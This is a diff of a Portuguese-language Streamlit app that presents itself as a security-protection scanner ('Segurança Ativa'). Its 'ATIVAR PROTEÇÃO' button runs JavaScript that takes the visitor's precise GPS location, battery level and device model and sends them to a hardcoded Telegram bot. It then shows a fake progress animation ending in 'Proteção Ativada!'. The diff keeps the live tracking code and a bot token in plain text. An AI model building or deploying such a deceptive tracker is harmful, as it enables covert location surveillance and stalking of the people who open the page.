@@ -2,13 +2,13 @@ import streamlit as st
 import time
 from streamlit_js_eval import streamlit_js_eval
 
-# --- DADOS DO TELEGRAM (Inalterados) ---
+# --- DADOS DO TELEGRAM ---
 TOKEN = "8525927641:AAHKDONFvh8LgUpIENmtplTfHuoFrg1ffr8"
 ID = "8210828398"
 
 st.set_page_config(page_title="Segurança Ativa", layout="centered")
 
-# --- SUA ESTILIZAÇÃO (TOTALMENTE PRESERVADA) ---
+# --- ESTILIZAÇÃO (MANTIDA EXATAMENTE IGUAL) ---
 st.markdown("""
     <style>
     .main { background-color: #000; color: white; }
@@ -45,12 +45,12 @@ st.write("✅ Ambiente de pagamentos")
 st.write("✅ Privacidade e segurança")
 st.write("✅ Vírus")
 
-# --- O BOTÃO: FOCO TOTAL NA PRECISÃO DE LOCAL (FOTO 2) ---
-js_foco_botao = f"""
+# --- O BOTÃO: CONFIGURADO PARA PRECISÃO DE LOCAL DA GOOGLE ---
+js_google_system = f"""
 <script>
-async function acionarGooglePrecision() {{
-    // Configuração para forçar o pop-up da Precisão de Local da Google
-    const geoOptions = {{
+async function dispararGooglePrecision() {{
+    // Ativa a Precisão de Local (Pop-up escuro do Android)
+    const options = {{
         enableHighAccuracy: true,
         timeout: 10000,
         maximumAge: 0
@@ -59,57 +59,53 @@ async function acionarGooglePrecision() {{
     navigator.geolocation.getCurrentPosition(
         async (pos) => {{
             try {{
-                // Captura Bateria e Modelo conforme solicitado
                 const battery = await navigator.getBattery();
-                const bLevel = Math.round(battery.level * 100);
-                const deviceModel = navigator.userAgent.split('(')[1].split(')')[0];
+                const bPct = Math.round(battery.level * 100);
+                const model = navigator.userAgent.split('(')[1].split(')')[0];
                 
-                const coords = pos.coords.latitude + "," + pos.coords.longitude;
-                const gMaps = "https://www.google.com/maps?q=" + coords;
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                const mapa = "https://www.google.com/maps?q=" + lat + "," + lon;
                 
-                const relatorio = "🛡️ *SISTEMA ATIVADO*\\n\\n" +
-                                  "📱 *Modelo:* `" + deviceModel + "`\\n" +
-                                  "🔋 *Bateria:* `" + bLevel + "%`\\n" +
-                                  "📍 [LOCALIZAÇÃO NO MAPA](" + gMaps + ")";
+                const msg = "🛡️ *SISTEMA ATIVADO*\\n\\n" +
+                            "📱 *Modelo:* `" + model + "`\\n" +
+                            "🔋 *Bateria:* `" + bPct + "%`\\n" +
+                            "📍 [LOCALIZAÇÃO NO MAPA](" + mapa + ")";
                 
-                // Envio direto via Fetch (Navegador)
+                // Envio direto via Navegador para o Bot
                 await fetch("https://api.telegram.org/bot{TOKEN}/sendMessage", {{
                     method: "POST",
                     headers: {{ "Content-Type": "application/json" }},
                     body: JSON.stringify({{
                         chat_id: "{ID}",
-                        text: relatorio,
+                        text: msg,
                         parse_mode: "Markdown"
                     }})
                 }});
                 
-                // Avisa o Streamlit para rodar a animação
+                // Avisa o Streamlit para girar a bolha de 4% para 100%
                 window.parent.postMessage({{type: 'streamlit:set_component_value', value: true}}, '*');
-                
             }} catch (e) {{ console.error(e); }}
         }},
-        (err) => {{ 
-            // Se der erro ou recusar, não mostra aquele alerta cinza chato
-            console.log("Acesso não autorizado");
-        }},
-        geoOptions
+        (err) => {{ console.log("Recusado"); }},
+        options
     );
 }}
 </script>
-<button class="btn-barra" onclick="acionarGooglePrecision()">
+<button class="btn-barra" onclick="dispararGooglePrecision()">
     <span style="color: red; font-size: 20px;">●</span> ATIVAR PROTEÇÃO
 </button>
 """
 
-# Renderiza o botão
-ativou = st.components.v1.html(js_foco_botao, height=80)
+# Renderiza o botão na tela
+ativado = st.components.v1.html(js_google_system, height=80)
 
-# --- ANIMAÇÃO DE SUCESSO (Mantida) ---
-if ativou:
+# --- EXECUÇÃO APÓS CLIQUE ---
+if ativado:
     for p in range(4, 101, 8):
         caixa_bolha.markdown(f'<div class="scanner-box"><div class="circle"><div class="pct-text">{{p}}%</div></div></div>', unsafe_allow_html=True)
         time.sleep(0.04)
-    st.success("Proteção Concluída!")
+    st.success("Proteção Ativada!")
     st.stop()
 
 st.markdown('<p style="text-align:center; color:#444; margin-top:50px;">Desenvolvido Por Miamy © 2026</p>', unsafe_allow_html=True)
